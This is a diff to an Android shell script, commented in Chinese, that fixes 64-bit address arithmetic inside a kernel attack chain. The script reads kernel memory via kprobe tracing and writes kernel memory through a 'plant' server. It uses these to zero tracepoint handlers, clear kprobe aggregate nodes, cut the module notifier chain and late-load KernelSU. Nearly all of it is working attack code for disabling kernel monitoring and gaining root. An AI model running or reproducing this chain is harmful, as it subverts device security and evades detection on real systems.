@@ -35,33 +35,50 @@ say() { printf '%s\n' "$*" >> "$RUNLOG" 2>/dev/null; echo "$*"; }
 dump_log() { :; }
 die() { say "[X] $*"; exit 2; }
 
-# ---------- 32 位分半的十六进制运算（全内建，不 fork） ----------
-HEXD=0123456789abcdef
-hex8() { # $1=0..4294967295 -> HOUT
-  _v=$1; _s=''; _i=8
+# ---------- 64 位地址运算 ----------
+# 踩过的坑：Android 的 mksh 用 32 位整数做 $(( ))，$((0x80000000)) 直接是负数，
+# 16 位内核地址一参与运算就溢出，进位循环永远退不出来 —— 表现就是日志停在
+# READY slide=… 之后再无输出。所以这里一点 shell 算术都不做，全部交给 awk：
+# awk 里也只用字符 + 每段 16 以内的加法，不碰浮点（double 撑不住 48 位地址）。
+HEXADD='
+function hv(c){ return index("0123456789abcdef", tolower(c)) - 1 }
+function hd(n){ return substr("0123456789abcdef", n + 1, 1) }
+function add(a, b,   i, c, d, o) {
+  while (length(a) < length(b)) a = "0" a
+  while (length(b) < length(a)) b = "0" b
+  c = 0; o = ""
+  for (i = length(a); i > 0; i--) {
+    d = hv(substr(a, i, 1)) + hv(substr(b, i, 1)) + c
+    c = int(d / 16)
+    o = hd(d % 16) o
+  }
+  if (c > 0) o = "1" o
+  return o
+}'
+
+hexadd() { # $1 $2 都是纯 hex 串（可不等长） -> HOUT
+  _r=$(awk -v a="$1" -v b="$2" "$HEXADD"'
+BEGIN { printf "%s", add(a, b) }')
+  [ -n "$_r" ] || { say "[X] 地址运算失败：$1 + $2"; exit 2; }
+  HOUT=$_r
+}
+hadd() { hexadd "$1" "$2"; }
+hlt() { # $1 < $2 ?（等长 hex 串直接按字典序比）
+  [ "${#1}" -lt "${#2}" ] && return 0
+  [ "${#1}" -gt "${#2}" ] && return 1
+  [ "$1" \< "$2" ]
+}
+hexoff() { # 十进制小整数 -> 8 位 hex，放 HOUT
+  _d=$1
+  [ "$_d" -lt 0 ] && _d=0
+  _h=''
+  _i=8
   while [ $_i -gt 0 ]; do
-    _s="${HEXD:$((_v & 15)):1}$_s"
-    _v=$((_v >> 4))
+    _h="$(printf '%x' $((_d % 16)))$_h"
+    _d=$((_d / 16))
     _i=$((_i - 1))
   done
-  HOUT=$_s
-}
-hadd() { # $1=16位hex  $2=十进制增量 -> HOUT
-  _a=$1; _d=$2
-  _al=$((0x${_a#????????})); _ah=$((0x${_a%????????}))
-  _nl=$((_al + _d)); _nh=$_ah
-  while [ $_nl -ge 4294967296 ]; do _nl=$((_nl - 4294967296)); _nh=$((_nh + 1)); done
-  while [ $_nl -lt 0 ]; do _nl=$((_nl + 4294967296)); _nh=$((_nh - 1)); done
-  _nh=$((_nh & 4294967295))
-  hex8 $_nh; _h=$HOUT
-  hex8 $_nl; _l=$HOUT
-  HOUT="$_h$_l"
-}
-hlt() { # $1 < $2 ?（两个 16 位 hex）
-  _xh=$((0x${1%????????})); _yh=$((0x${2%????????}))
-  [ $_xh -lt $_yh ] && return 0
-  [ $_xh -gt $_yh ] && return 1
-  [ $((0x${1#????????})) -lt $((0x${2#????????})) ]
+  HOUT=$_h
 }
 
 # ---------- chan 通道 ----------
@@ -85,16 +102,19 @@ kread() { # 地址... -> KV0 KV1 ...（hex，不带 0x；读不到为空）
     echo 'echo 1 > tracing_on'
     echo 'echo > trace'
     echo "$D/probe > /dev/null 2>&1"
-    echo 'sleep 1'
+    echo '/system/bin/usleep 1000000'
     echo 'echo 0 > tracing_on'
     echo "grep '$_ev:' trace | tail -1"
     echo 'echo 0 > events/kprobes/enable 2>/dev/null'
     echo "echo $_dm"
   } | write_run
   _w=0
-  while [ $_w -lt 75 ]; do
+  while [ $_w -lt 40 ]; do
     sleep 2; _w=$((_w + 1))
     grep -aq "$_dm" "$LOG" && break
+    case $_w in
+      5|10|15|20|25) say "    ...等 kread 回读 $((_w * 2)) 秒" ;;
+    esac
   done
   _line=$(grep -a "$_ev:" "$LOG" | tail -1)
   [ -n "$_line" ] || return 1
@@ -108,19 +128,24 @@ kread() { # 地址... -> KV0 KV1 ...（hex，不带 0x；读不到为空）
 
 plant() { # $1=地址 $2=模式(默认0)
   _addr=$1; _mode=${2:-0}; _p=0
-  while [ $_p -lt 6 ]; do
+  while [ $_p -lt 3 ]; do
     _p=$((_p + 1))
     rm -f "$CH/plant_res" "$CH/plant_done"
     printf '%s %s\n' "$_addr" "$_mode" > "$CH/plant_req"
     _w=0
-    while [ $_w -lt 90 ]; do
+    while [ $_w -lt 30 ]; do
       sleep 2; _w=$((_w + 1))
       [ -s "$CH/plant_res" ] && break
+      case $_w in
+        3|6|9|12) say "    ...等 plant_res $((_w * 2)) 秒（addr=$_addr）" ;;
+      esac
     done
     _res=$(cat "$CH/plant_res" 2>/dev/null)
-    say "  [plant] $_addr #$_p -> ${_res:-timeout}"
+    say "  [plant] 0x$_addr #$_p -> ${_res:-timeout}"
     case "$_res" in 1*) return 0 ;; esac
   done
+  say "  [X] plant 三次都没回执：plant server 没在消费 chan/plant_req，"
+  say "      或 fakeR.log 里还没有 [fake] dispatcher ready"
   return 1
 }
 
@@ -227,24 +252,25 @@ fi
 
 SLIDE=$(grep -o 'slide=0x[0-9a-f]*' "$LOG" 2>/dev/null | tail -1 | sed 's/.*0x//')
 [ -n "$SLIDE" ] || die "日志里没有 slide"
-SLIDE_DEC=$((0x$SLIDE))
 say "  READY slide=0x$SLIDE"
 
-hadd "$IMAGE_BASE" "$SLIDE_DEC"; BASE="$HOUT"
-hadd "$BASE" 50331648; LIMIT="$HOUT"
+hadd "$IMAGE_BASE" "$SLIDE"; BASE="$HOUT"
+hadd "$BASE" 03000000; LIMIT="$HOUT"
 
 # ---------- 2. vr funcs ----------
 say "[3/7] 清 vr funcs"
-hadd "$TRACE_SYS_EXIT" "$SLIDE_DEC"
-hadd "$HOUT" 72; VR="$HOUT"
+hadd "$TRACE_SYS_EXIT" "$SLIDE"
+hadd "$HOUT" 48; VR="$HOUT"
+say "  slide=0x$SLIDE base=0x$BASE"
+say "  vr_funcs=0x$VR"
 plant "$VR" 0 || die "VR PLANT FAILED"
 kread "$VR"; zero_check "vr funcs"
 say "  vr funcs after = ${KV0:-none}"
 
 # ---------- 3. kprobe 聚合节点 / pre_handler ----------
 say "[4/7] 扫 kprobe 桶，找聚合节点"
-hadd "$LOAD_MODULE" "$SLIDE_DEC"; LM="$HOUT"
-hadd "$KPROBE_TABLE" "$SLIDE_DEC"; TB="$HOUT"
+hadd "$LOAD_MODULE" "$SLIDE"; LM="$HOUT"
+hadd "$KPROBE_TABLE" "$SLIDE"; TB="$HOUT"
 say "  lm=$LM"
 
 CANDS=''
@@ -252,7 +278,7 @@ _b=0
 while [ $_b -lt 64 ]; do
   _addrs=''; _j=0
   while [ $_j -lt 16 ]; do
-    hadd "$TB" $(( (_b + _j) * 8 )); _addrs="$_addrs $HOUT"
+    hexoff $(( (_b + _j) * 8 )); hadd "$TB" "$HOUT"; _addrs="$_addrs $HOUT"
     _j=$((_j + 1))
   done
   kread $_addrs
@@ -268,14 +294,14 @@ say "  桶内有效指针 $(echo $CANDS | wc -w) 个"
 
 AGGR=''
 for _c in $CANDS; do
-  hadd "$_c" 40; _ap="$HOUT"
+  hadd "$_c" 28; _ap="$HOUT"
   kread "$_ap"
   [ "${KV0:-}" = "$LM" ] && { AGGR=$_c; break; }
 done
 [ -n "$AGGR" ] || die "AGGR NOT FOUND（slide 或 KPROBE_TABLE 不对）"
 say "  aggr=$AGGR"
 
-hadd "$AGGR" 16; _head="$HOUT"
+hadd "$AGGR" 10; _head="$HOUT"
 kread "$_head"; NODE=${KV0:-}
 # 判据（手册 §7.2 实测三条规则）：
 #   1. 桶头自身也要看，不能只遍历 list.next；
@@ -284,8 +310,8 @@ kread "$_head"; NODE=${KV0:-}
 #   3. 优先清 slab 地址（< 0xffffffc000000000）的节点，链条遍历上限 8 跳。
 TARGET=''; TARGET_SLAB=0; _i=0
 while [ $_i -lt 8 ] && [ -n "$NODE" ] && [ "$NODE" != "$_head" ]; do
-  hadd "$NODE" 24; _an="$HOUT"
-  hadd "$NODE" 48; _ap="$HOUT"
+  hadd "$NODE" 18; _an="$HOUT"
+  hadd "$NODE" 30; _ap="$HOUT"
   kread "$NODE" "$_an" "$_ap"
   NN=${KV0:-}; _addr=${KV1:-}; _pre=${KV2:-}
   say "  node=$NODE addr=$_addr pre=$_pre"
@@ -318,14 +344,14 @@ fi
 
 # ---------- 4. notifier 链 ----------
 say "[5/7] 截断 module notifier 链"
-hadd "$MODULE_NOTIFY_LIST" "$SLIDE_DEC"; NH="$HOUT"
-hadd "$NH" 64; kread "$HOUT"; NODE=${KV0:-}
+hadd "$MODULE_NOTIFY_LIST" "$SLIDE"; NH="$HOUT"
+hadd "$NH" 40; kread "$HOUT"; NODE=${KV0:-}
 say "  notifier head $NODE"
-hadd "$TRACE_MODULE_NOTIFY" "$SLIDE_DEC"; WANT="$HOUT"
+hadd "$TRACE_MODULE_NOTIFY" "$SLIDE"; WANT="$HOUT"
 NT=''; _i=0
 while [ $_i -lt 16 ] && [ -n "$NODE" ]; do
-  hadd "$NODE" 8; _nn_a="$HOUT"
-  hadd "$NODE" 16; _pr_a="$HOUT"
+  hadd "$NODE" 08; _nn_a="$HOUT"
+  hadd "$NODE" 10; _pr_a="$HOUT"
   kread "$NODE" "$_nn_a" "$_pr_a"
   CALL=${KV0:-}; NN=${KV1:-}
   say "  nb $NODE call=$CALL next=$NN"
@@ -347,13 +373,13 @@ fi
 say "  ALL PLANTS OK"
 
 # ---------- 5. kallsyms ----------
-say "[6/7] 生成 kallsyms（128943 行，几十秒）"
-while read -r _a _t _n; do
-  [ -z "$_a" ] && continue
-  hadd "$_a" "$SLIDE_DEC"
-  echo "$HOUT $_t $_n"
-done < "$D/symbols.txt" > "$D/kall"
-say "  KALLSYMS_OK $(wc -l < "$D/kall" | tr -d ' ')"
+say "[6/7] 生成 kallsyms（128943 行，全部加 slide）"
+awk -v s="$SLIDE" "$HEXADD"'
+{ if (NF >= 3 && $1 ~ /^[0-9a-f]+$/) { $1 = add($1, s) } print }
+' "$D/symbols.txt" > "$D/kall"
+_kc=$(wc -l < "$D/kall" | tr -d ' ')
+say "  KALLSYMS_OK $_kc 个符号"
+[ "$_kc" = "128943" ] || say "  [!] 行数不是 128943，ksud 找符号会失败"
 
 # ---------- 6. late-load ----------
 say "[7/7] ksud late-load（install → late-load → 等 /proc/modules）"
